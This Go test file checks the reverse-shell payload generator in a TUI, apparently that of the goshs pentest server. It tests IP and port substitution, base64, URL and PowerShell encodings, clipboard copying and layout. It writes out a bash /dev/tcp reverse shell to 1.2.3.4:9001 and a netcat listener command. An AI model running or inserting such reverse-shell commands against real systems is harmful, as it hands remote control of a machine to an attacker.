package tui

import (
	"encoding/base64"
	"strings"
	"testing"
	"unicode/utf16"

	tea "github.com/charmbracelet/bubbletea"

	"goshs.de/goshs/v2/options"
)

// tmplByName returns the raw template for a payload by its display name.
func tmplByName(t *testing.T, name string) string {
	t.Helper()
	for _, e := range shellDB {
		if e.name == name {
			return e.tmpl
		}
	}
	t.Fatalf("shellDB has no entry %q", name)
	return ""
}

func TestGenerateCommandSubstitutesIPAndPort(t *testing.T) {
	got := generateCommand(tmplByName(t, "Bash -i"), "1.2.3.4", "9001", encNone)
	want := "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"
	if got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func TestGenerateCommandSubstitutesLowercasePlaceholders(t *testing.T) {
	// PowerShell #2 uses the lowercase {port} placeholder.
	got := generateCommand(tmplByName(t, "PowerShell #2"), "10.0.0.1", "4444", encNone)
	if strings.Contains(got, "{port}") || strings.Contains(got, "{PORT}") {
		t.Fatalf("unsubstituted placeholder remained: %q", got)
	}
	if !strings.Contains(got, "10.0.0.1") || !strings.Contains(got, "4444") {
		t.Fatalf("expected ip/port in output: %q", got)
	}
}

func TestGenerateCommandBase64Encoding(t *testing.T) {
	raw := generateCommand(tmplByName(t, "Bash -i"), "1.2.3.4", "9001", encNone)
	enc := generateCommand(tmplByName(t, "Bash -i"), "1.2.3.4", "9001", encBase64)
	dec, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		t.Fatalf("output is not valid base64: %v", err)
	}
	if string(dec) != raw {
		t.Fatalf("base64 round-trip mismatch: got %q want %q", dec, raw)
	}
}

func TestGenerateCommandURLEncoding(t *testing.T) {
	got := generateCommand(tmplByName(t, "Bash -i"), "1.2.3.4", "9001", encURL)
	// encodeURIComponent parity: spaces become %20 (never +), and reserved
	// shell metacharacters are percent-encoded.
	if strings.Contains(got, "+") {
		t.Fatalf("url encoding must not emit '+': %q", got)
	}
	if strings.Contains(got, " ") {
		t.Fatalf("url encoding left a raw space: %q", got)
	}
	if !strings.Contains(got, "%20") || !strings.Contains(got, "%3E") {
		t.Fatalf("expected %%20 and %%3E in %q", got)
	}
}

func TestGenerateCommandPSBase64WrapsPowershellEncodedCommand(t *testing.T) {
	name := "PowerShell #3 (Base64)"
	got := generateCommand(tmplByName(t, name), "10.0.0.1", "4444", encNone)
	const prefix = "powershell -e "
	if !strings.HasPrefix(got, prefix) {
		t.Fatalf("expected %q prefix, got %q", prefix, got)
	}
	// The body must decode (base64) to the UTF-16LE encoding of the filled,
	// prefix-stripped template — what -EncodedCommand expects.
	raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(got, prefix))
	if err != nil {
		t.Fatalf("payload is not valid base64: %v", err)
	}
	wantTmpl := strings.TrimPrefix(tmplByName(t, name), psB64Prefix)
	wantTmpl = strings.NewReplacer("{IP}", "10.0.0.1", "{ip}", "10.0.0.1",
		"{PORT}", "4444", "{port}", "4444").Replace(wantTmpl)
	if decodeUTF16LE(raw) != wantTmpl {
		t.Fatalf("decoded payload mismatch")
	}
	// The encoding selector must be ignored for PS_B64 templates.
	if other := generateCommand(tmplByName(t, name), "10.0.0.1", "4444", encURL); other != got {
		t.Fatalf("encoding should be ignored for PS_B64 templates")
	}
}

func TestEncodingNextCycles(t *testing.T) {
	if got := encNone.next(); got != encURL {
		t.Fatalf("encNone.next() = %v, want encURL", got)
	}
	if got := encURL.next(); got != encBase64 {
		t.Fatalf("encURL.next() = %v, want encBase64", got)
	}
	if got := encBase64.next(); got != encNone {
		t.Fatalf("encBase64.next() = %v, want encNone", got)
	}
}

func TestGeneratorKeyNavigationClamps(t *testing.T) {
	m := &model{panes: []*pane{{name: "GENERATOR"}}, active: 0}
	// paneGenerator index in the real model differs, but handleGeneratorKey is
	// driven purely off m.genSel, so a bare model suffices here.
	m.genSel = 0
	if _, handled := m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("k")}); !handled {
		t.Fatal("up/k should be handled by the generator")
	}
	if m.genSel != 0 {
		t.Fatalf("genSel must not go below 0, got %d", m.genSel)
	}
	m.genSel = len(shellDB) - 1
	m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("j")})
	if m.genSel != len(shellDB)-1 {
		t.Fatalf("genSel must not exceed %d, got %d", len(shellDB)-1, m.genSel)
	}
	// 'g'/'G' jump to first/last.
	m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("g")})
	if m.genSel != 0 {
		t.Fatalf("g should jump to first, got %d", m.genSel)
	}
	m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("G")})
	if m.genSel != len(shellDB)-1 {
		t.Fatalf("G should jump to last, got %d", m.genSel)
	}
}

func TestGeneratorKeyEncodingToggle(t *testing.T) {
	m := &model{}
	m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("n")})
	if m.genEnc != encURL {
		t.Fatalf("n should advance encoding to url, got %v", m.genEnc)
	}
}

func TestGeneratorKeyCopyStagesOSC52(t *testing.T) {
	m := &model{genIP: "10.9.8.7", genPort: "1337", genSel: 0}
	cmd := generateCommand(shellDB[0].tmpl, m.genIP, m.genPort, m.genEnc)

	if _, handled := m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("y")}); !handled {
		t.Fatal("y should be handled by the generator")
	}
	if m.clipSeq == "" {
		t.Fatal("y should stage an OSC 52 sequence in clipSeq")
	}
	// The OSC 52 payload is the base64 of the command; it appears verbatim even
	// when wrapped for tmux/screen, so this holds regardless of the test env. We
	// copy to both the system clipboard ('c') and the X11 PRIMARY ('p') selection,
	// so the payload appears twice — once per sequence.
	want := base64.StdEncoding.EncodeToString([]byte(cmd))
	if n := strings.Count(m.clipSeq, want); n != 2 {
		t.Fatalf("clipSeq should carry the command twice, once per selection (want 2, got %d)\nseq: %q", n, m.clipSeq)
	}
	if !strings.Contains(m.clipSeq, ";c;") || !strings.Contains(m.clipSeq, ";p;") {
		t.Fatalf("clipSeq should target both the system (;c;) and primary (;p;) buffers\nseq: %q", m.clipSeq)
	}
	if m.flash == "" {
		t.Fatal("copy should set a flash message")
	}
}

func TestViewEmitsClipboardSequenceOnce(t *testing.T) {
	opts := &options.Options{IP: "0.0.0.0", Port: 8000, Webroot: "/srv"}
	m := newModel(opts, nil, nil, nil, nil, nil, nil)
	m.width, m.height, m.active = 100, 40, paneGenerator
	m.genIP, m.genPort, m.genSel = "10.9.8.7", "1337", 0
	m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("c")})
	seq := m.clipSeq
	if seq == "" {
		t.Fatal("c should stage a clipboard sequence")
	}
	if first := m.View(); !strings.Contains(first, seq) {
		t.Fatal("first View after copy must emit the OSC 52 sequence")
	}
	if m.clipSeq != "" {
		t.Fatal("View must clear clipSeq after emitting it")
	}
	if second := m.View(); strings.Contains(second, seq) {
		t.Fatal("second View must not re-emit the sequence")
	}
}

func TestGeneratorKeyLeavesPaneSwitchingAlone(t *testing.T) {
	m := &model{}
	if _, handled := m.handleGeneratorKey(tea.KeyMsg{Type: tea.KeyTab}); handled {
		t.Fatal("tab must fall through so pane switching still works")
	}
}

func TestGeneratorViewRendersFormFields(t *testing.T) {
	m := &model{width: 100, genIP: "10.9.8.7", genPort: "1337", genSel: 0}
	const h = 20
	out := m.generatorView(h)
	if n := strings.Count(out, "\n") + 1; n != h {
		t.Fatalf("generatorView produced %d lines, want %d", n, h)
	}
	for _, want := range []string{"10.9.8.7", "LPORT", shellDB[0].name, "nc -lvnp 1337"} {
		if !strings.Contains(out, want) {
			t.Fatalf("generator view missing %q\n%s", want, out)
		}
	}
}

// TestGeneratorViewStacksListAboveOutput guards the layout that makes the
// generated command cleanly selectable: the payload list and the output must be
// stacked vertically, never sharing a physical row. If they shared a row, the
// terminal's rectangular mouse selection would grab list text alongside the
// command.
func TestGeneratorViewStacksListAboveOutput(t *testing.T) {
	m := &model{width: 100, genIP: "10.9.8.7", genPort: "1337", genSel: 0}
	lines := strings.Split(m.generatorView(20), "\n")

	listRow, outRow := -1, -1
	for i, ln := range lines {
		if strings.Contains(ln, "▶") {
			listRow = i
		}
		if strings.Contains(ln, "nc -lvnp 1337") {
			outRow = i
		}
		if strings.Contains(ln, "▶") && strings.Contains(ln, "nc -lvnp 1337") {
			t.Fatalf("list and output share row %d: %q", i, ln)
		}
	}
	if listRow == -1 {
		t.Fatal("no selected payload row (▶) found")
	}
	if outRow == -1 {
		t.Fatal("no listener output row found")
	}
	if listRow >= outRow {
		t.Fatalf("list row %d should be above output row %d", listRow, outRow)
	}
}

func TestGeneratorTabHasNoCount(t *testing.T) {
	opts := &options.Options{IP: "0.0.0.0", Port: 8000, Webroot: "/srv"}
	m := newModel(opts, nil, nil, nil, nil, nil, nil)
	m.width, m.active = 120, paneGenerator
	tabs := m.tabs()
	if !strings.Contains(tabs, "GENERATOR") {
		t.Fatalf("tab bar missing GENERATOR: %s", tabs)
	}
	if strings.Contains(tabs, "GENERATOR(") {
		t.Fatalf("GENERATOR tab should carry no (count): %s", tabs)
	}
}

// decodeUTF16LE is the inverse of utf16LE, for asserting -EncodedCommand output.
func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		return ""
	}
	u := make([]uint16, len(b)/2)
	for i := range u {
		u[i] = uint16(b[i*2]) | uint16(b[i*2+1])<<8
	}
	return string(utf16.Decode(u))
}
